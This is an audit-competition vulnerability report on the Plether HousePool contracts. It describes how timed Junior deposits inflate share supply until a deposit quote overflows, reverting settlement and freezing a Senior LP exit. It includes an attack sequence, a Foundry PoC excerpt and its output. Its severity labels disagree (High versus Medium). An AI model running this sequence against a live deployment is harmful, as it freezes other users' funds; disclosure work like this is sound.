# \#99466 [SC-High] Junior deposit quote overflow at near-zero Junior NAV reverts LP epoch settlement and freezes matured Senior exits

**Submitted on Nov 13th 2026 at 19:15:15 UTC by @truthlover for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99466
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

`HousePool._settleLpEpoch` funds matured Senior and Junior redemptions and then, in the same call, activates pending Junior deposits, deferring activation only when Junior pricing assets are exactly zero. After the Senior coupon has drained Junior NAV, an unprivileged depositor inflates Junior share supply with small, timed deposits and then queues a refundable deposit whose share quote exceeds `uint256`, so `TrancheVault.quoteDepositFromState` panics and the whole settlement reverts. An independent LP's matured 1.0M USDG Senior exit stays unfunded until Junior NAV reaches exactly zero. In the PoC the exit stays unfunded for 6 hours. This is temporary freezing of funds for at least 1 hour.

## Vulnerability Details

Withdrawal funding is documented as not blocked merely because entries are deferred [1]. `_settleLpEpoch` funds the Senior and Junior redemption phases [2], then, unless the pool is paused or entries are gated, runs the Junior deposit phase, skipping it only when `juniorPrincipal == 0 && juniorSupply != 0` [3]. `_settleDepositPhase` calls `quoteDepositFromState` for each matured epoch without containment, before its `shares == 0` rejection branch [4]. With the Junior fee of 0 the quote is `mulDiv(assets, supply + 1000, J + 1)`, where `J` is Junior pricing assets [5]; OpenZeppelin `mulDiv` panics with `0x11` when the result exceeds 256 bits [6], reverting the whole call, redemption funding included. Cecuro LOW-72, fixed in commit 899675594d1e [7], made the `estimateDepositShares` view return 0 at exactly zero pricing assets with surviving shares [8]; the settlement path calls `quoteDepositFromState` directly and is unchanged.

With open positions `HousePool.settleLpEpoch` accepts only the router [9], whose `settleLpEpoch` anyone can call with a Pyth update [10]. The coupon accrues per second out of Junior principal, capped at it [11]. Junior deposits are admitted at any `J > 0` [12], with a 1 USDG minimum and one-hour epochs [13].

Attack sequence (PoC values, release configuration, 80/20 pool at the Senior share cap):

1. With no actor involved, the coupon drains Junior from 2.0M to 23,867 USDG over 1,127 days.
2. Traders hold a book with long open interest 1.5 times short; the attacker opens a 187,500-unit short that brings the pool's net exposure to 0.
3. The attacker lands a 6,270.7 USDG deposit sized so that 330 hours later `J` is about 63,000 atoms (2.5 seconds of coupon) at an epoch start.
4. Mostly every four hours, a deposit of usually about 365.5 USDG (up to 5,028.5 USDG), requested in the previous hour, lands at the epoch's first second, multiplying Junior supply about 5,760-fold at the 63,000-atom target and 14- to 8,000-fold after late flows; the coupon moves it to Senior before the next landing. After 23 landings (485 hours) supply is 6.82e75.
5. An independent Senior LP requests a 10% exit (798,376,267,652,235 shares). In the same epoch the attacker requests a 20,000 USDG Junior deposit and an independent Junior LP requests a 10,000 USDG deposit.
6. At maturity, with `J` at 498.0 USDG, the Senior phase funds the exit, the Junior quote overflows, and `settleLpEpoch` reverts with `Panic(0x11)`; the exit's claimable shares stay 0.

A USDG donation leaves `J` unchanged because `totalAssets` is the lesser of balance and `accountedAssets` [14]. The depositor cannot cancel the queued deposit once its epoch is current (`TrancheVault__DepositEpochAlreadyActive` [15]), and a third party fails the controller check [15].

**Prerequisites.**

- Drained Junior: the coupon is funded from Junior NAV and capped by Junior principal by design [16], and the project's replay records a minimum Junior principal of $0 in every strategy [17]; the PoC reaches it by time alone at release parameters [18], then marks the recorded daily ECB basket fixes from 2026-05-06, one per simulated day (about 21 used) [19].
- Hedge: on a net-exposed book, open trader profit reduces LP equity in reconciliation [20], and Senior impairment stops entries [21], so the attacker holds a short equal to the pool's net exposure, an ordinary permissionless position, and after each late trade re-hedges with its own delayed order, which executes one block after commit [22], 2 seconds after the trader's. In the PoC no landing sees Senior impaired.
- Landing timing: anyone, including the attacker, can send each landing settle at the epoch start. The window is `J` over the coupon, 2.5 seconds at the 63,000-atom target, and a larger `J` widens it at the cost of more landings: the PoC's late-flow landings land at up to 40,613,177 atoms (about 1,600 seconds) and the route still completes. The freeze falls in market hours because entries are skipped while the oracle is frozen [23].
- Late flows: unrelated traders open and keep 50,000 USDG positions within 25 minutes before every third landing and the final landing (8 in total). Revenue arriving before a landing only raises `J`, because reconciliation pays the coupon from stored principal before distributing revenue [24], and the attacker sizes each deposit from observed state.

**Recommendation.** In `_settleDepositPhase`, extend the exact-zero deferral to unrepresentable or degenerate quotes: when the high word of `Math.mul512(netAssets, supply + 1000)` is not below the denominator, or pricing assets per share fall below a floor, defer (or reject and refund) that deposit epoch instead of quoting. The Senior deposit phase [25] and `quoteBootstrapDeposit` [26] use the same quote shape and should get the same guard; capping the shares one deposit can mint relative to supply also prevents the inflation.

## Impact Details

The independent Senior LP's matured exit is 798,376,267,652,235 shares; the no-attack control at the same state and second pays it in full, 1,002,044,695,150 USDG atoms. With the attack, every settle at maturity and at +1 to +5 hours reverts with `Panic(0x11)`: the exit's claimable shares stay 0 and the independent Junior LP's 10,000 USDG deposit stays pending and unprocessed. `settleLpEpoch`, the only path that funds LP exits [2], reverts as a whole. The settle at +6 hours, with `J` at exactly 0, funds the exit, which is then paid in full (1,002,094,494,989 atoms): the freeze lasts exactly 21,600 seconds. It also ends with an owner or pauser `pause()` [27], an oracle freeze that skips entries [23], Senior impairment [21], or Junior revenue large enough for the quote to fit [5].

No funds are lost: Senior principal equals its high-water mark after the freeze, the attacker's 20,000 USDG deposit is refunded, and the hedge margin is returned. The attack costs 23,987.50 USDG: 20,991.77 in landing deposits and 2,995.73 in the hedge's net realized cost, including its price loss on the recorded path.

Severity: Medium, Temporary freezing of funds for at least 1 hour; the deciding qualifier is the 6-hour duration.

## References

1. SECURITY.md, entry deferral does not block withdrawal funding, L830-L833: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L830-L833
2. HousePool.sol, `_settleLpEpoch` redemption phases, L854-L888: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L854-L888
3. HousePool.sol, `_settleLpEpoch` pause and entry gates and Junior deposit deferral, L903-L920: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L903-L920
4. HousePool.sol, `_settleDepositPhase` quote and `shares == 0` branch, L1030-L1066: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1066
5. TrancheVault.sol, `quoteDepositFromState`, L1398-L1410: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1398-L1410
6. OpenZeppelin Contracts `Math.mulDiv` (submodule pin fcbae53), result-overflow panic, L204-L219: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/fcbae5394ae8ad52d8e580a3477db99814b9d565/contracts/utils/math/Math.sol#L204-L219
7. Cecuro LOW-72 fix, plether-core commit 899675594d1e: https://github.com/Plether-Fi/plether-core/commit/899675594d1e043383e10252a8985bac2e5b6271
8. TrancheVault.sol, `estimateDepositShares`, L1361-L1370: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1361-L1370
9. HousePool.sol, `settleLpEpoch` caller and mark checks, L797-L821: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L821
10. OrderRouter.sol, `settleLpEpoch`, L474-L484: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484
11. HousePoolWaterfallAccountingLib.sol, `paySeniorCoupon`, L65-L91: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L65-L91
12. HousePool.sol, `_canAcceptTrancheDeposits`, L480-L498: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L480-L498
13. HousePool.sol, `MIN_TRANCHE_DEPOSIT_ASSETS` and `LP_EPOCH_DURATION`, L176-L178: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L176-L178
14. HousePool.sol, `totalAssets`, L424-L429: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L424-L429
15. TrancheVault.sol, `cancelPendingDeposit` controller check, L832-L837, epoch revert, L851-L860, and `TrancheVault__DepositEpochAlreadyActive`, L163: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L832-L837 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L851-L860 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L163
16. SECURITY.md, Senior coupon model, L1184-L1188: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1184-L1188
17. WHITEPAPER.md, replay minimum Junior principal, L1612-L1618: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1612-L1618
18. DEPLOYMENT.md, release parameters, L137-L155, and HousePool.sol, default `seniorRateBps`, L249-L252: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L137-L155 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L249-L252
19. WHITEPAPER.md, recorded ECB basket series, L1958-L1960, and `whitepaper/generated/ecb_plether_basket.csv`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1958-L1960 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/whitepaper/generated/ecb_plether_basket.csv
20. HousePoolAccountingLib.sol, `buildReconcileSnapshot`, L60-L78: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78
21. HousePoolTrancheGateLib.sol, `trancheDepositsAllowed`, L28-L38: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolTrancheGateLib.sol#L28-L38
22. OrderRouterExecutionSidecar.sol, same-block execution deferral, L445-L448: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L445-L448
23. HousePool.sol, `_entryStatusBlocked`, L1139-L1145: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1139-L1145
24. HousePoolReconcilePlanLib.sol, coupon before revenue distribution, L55-L99: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L55-L99
25. HousePool.sol, Senior deposit phase, L928-L935: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L928-L935
26. TrancheVault.sol, `quoteBootstrapDeposit` and `_convertToSharesUsingAssets`, L1392-L1396 and L1853-L1859: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1392-L1396 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1853-L1859
27. HousePool.sol, `pause`, L384-L390: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L384-L390


## Link to Proof of Concept

https://gist.github.com/torxeon/a25028722d7f35b9499846d5533c032c

## Proof of Concept


The Foundry test drives the unmodified contracts at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` through `OrderRouter.settleLpEpoch` and asserts the release parameters (`seniorRateBps` 800, `maxSeniorShareBps` 8000, `maxSeniorExposureAssets` 40M, `baseCarryBps` 500).

Full PoC (two files and a README): https://gist.github.com/torxeon/a25028722d7f35b9499846d5533c032c

| Gist file | Target path |
| --- | --- |
| `PocBase.sol` | `packages/perps/test/poc/PocBase.sol` |
| `JuniorDepositQuoteOverflowFreeze.t.sol` | `packages/perps/test/poc/JuniorDepositQuoteOverflowFreeze.t.sol` |

`PocBase.sol` extends the repository's `test/perps/BasePerpTest.sol` fixture. Test-only substitutes: `deal` for actor capital, `vm.warp`/`vm.roll` for time, `vm.prank` for each actor's own calls, snapshots for the attacker's planning reads and the control branch, mock Pyth updates with zero confidence and one price across all six feeds, carrying the recorded ECB basket fixes (embedded in the test, interpolated hourly), one unrelated trader's open and close before landing 3, the fixture owner's `pause()` in its branch only, and a raised test gas limit. There are no storage writes other than `deal` balances and no change under `src/`.

Decisive excerpt of `JuniorDepositQuoteOverflowFreeze.t.sol`:

```solidity
        if (rehedge) {
            if (side == CfdTypes.Side.LONG) {
                _trade(attacker, CfdTypes.Side.SHORT, sz, sz / 1e12 / 5, false);
                attackerShort += sz;
                hedgeMarginPosted += sz / 1e12 / 5;
    ...
    function _attack() internal {
        _mark();
        uint256 sid = mRequestRedeem(seniorLP, seniorVault, shares10);
        uint256 wBefore = settlementToken.balanceOf(attackerLP);
        uint256 pid = mRequestDeposit(attackerLP, juniorVault, POISON);
        address juniorLP2 = makeAddr("juniorLP2");
        deal(address(settlementToken), juniorLP2, 10_000e6, true);
        uint256 jid = mRequestDeposit(juniorLP2, juniorVault, 10_000e6);
        _to(_matureAt());
        uint256 tM = _now();
        (bool ok, bytes memory err) = _settle();
    ...
        assertFalse(ok);
        assertEq(err, PANIC_OVERFLOW);
        assertEq(seniorVault.claimableRedeemRequest(sid, seniorLP), 0);

        uint256 h;
        while (!ok && h < 48) {
            _to(_now() + 1 hours);
            ++h;
            if (h == 1) _nonAdminCures(pid);
            uint256 jNow = _jSim(_now());
            (ok, err) = _settle();
            uint256 cl = seniorVault.claimableRedeemRequest(sid, seniorLP);
            console2.log("  retry +h", h, ok ? "settle OK" : "settle REVERTED Panic(0x11)");
            console2.log("    J", jNow, "Senior claimable", cl);
            console2.log("    px", _px(_now()), "seniorImpaired", pool.isSeniorImpairedAfterPendingDepositReconcile());
            if (!ok) {
                assertEq(err, PANIC_OVERFLOW);
                assertEq(cl, 0);
                uint256 jc = juniorVault.claimableDepositRequest(jid, juniorLP2);
                console2.log("    independent Junior LP deposit claimable", jc, "pending", juniorVault.pendingDepositRequest(jid, juniorLP2));
                assertEq(jc, 0);
            } else {
                console2.log("  exit funded with Junior pricing assets at", jNow);
                assertEq(jNow, 0);
            }
        }
        uint256 frozen = _now() - tM;
        console2.log("FREEZE seconds (first matured settle -> first success)", frozen, "J now", _j());
        assertGe(frozen, 1 hours);
        assertEq(frozen, EXPECTED_FREEZE_SECONDS);
```

Run at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with the two files in place:

```bash
cd packages/perps
forge test --match-path test/poc/JuniorDepositQuoteOverflowFreeze.t.sol \
  --gas-limit 9000000000000 --disable-block-gas-limit -vv
```

The raised gas limit is needed because the attacker's planning step simulates each landing with snapshot and revert.

Output (Solidity 0.8.35, via-IR):

```text
[PASS] test_juniorDepositQuoteOverflowFreezesSeniorExit() (gas: 2127660465)
Logs:
  POOL at Senior cap: S 7999949177126 J 1999964463219
  DRAIN days 1127 J 23867428124
  HEDGE attacker SHORT size 187500000000000000000000 J before 23884968035
    J after hedge 23867369496 attacker clearinghouse balance before 100000000000
  BOOK open: long OI 562400000000000000000000 short OI 562400000000000000000000
    pool net exposure (long OI - short OI incl. attacker hedge) 0 hedge on true
...
  LATE FLOW 0 LONG 50k opened, kept open
    seconds before landing 1139
    J before 29925620 J after trader open 31118948
    attacker re-hedged at 2 s after the trader's commit; J after 43292351
    pool net exposure long-short 0 short-long 0
  LANDING 3 J atoms 14430232
...
  CYCLING max |J_land - J_pred| 14366772 landings with Senior impaired 0
    late flows 8
    path px now 98563292 days on path 20
  ARMED after landings 23 attacker deposits (atoms) 20991768989
...
  CONTROL settle ok true Senior claimable shares 798376267652235
    CONTROL Senior exit paid (USDG atoms) 1002044695150
  ATTACK settle ok false J 497998451
  0x4e487b710000000000000000000000000000000000000000000000000000000000000011
    Senior claimable shares 0 requested 798376267652235
  CURE donation 100k USDG to HousePool then settle ok false
  CURE poison cancel by its owner during freeze: reverted
  0x1ad6d803
  CURE poison cancel by a third party during freeze: reverted
...
    retry +h 5 settle REVERTED Panic(0x11)
      J 40447919 Senior claimable 0
      px 98596908 seniorImpaired false
      independent Junior LP deposit claimable 0 pending 10000000000
    retry +h 6 settle OK
      J 0 Senior claimable 798376267652235
      px 98602510 seniorImpaired false
    exit funded with Junior pricing assets at 0
  FREEZE seconds (first matured settle -> first success) 21600 J now 0
    Senior exit paid after freeze (USDG atoms) 1002094494989
    seniorPrincipal 9018851710073 seniorHWM 9018851710073
    poison refunded after the freeze (atoms) 20000000000
    attacker USDG spent on landings (paid to Senior as coupon) 20991768989
...
    HEDGE closed: attacker clearinghouse balance 97004270595 before 100000000000
    HEDGE net cost (atoms, fees+VPI+carry-PnL) 2995729405 gain 0
    hedge margin posted (atoms, returned on close) 77500000000 TOTAL attacker cost deposits+hedge 23987498394
  PAUSE owner pause() then settle ok true Senior claimable 798376267652235
```

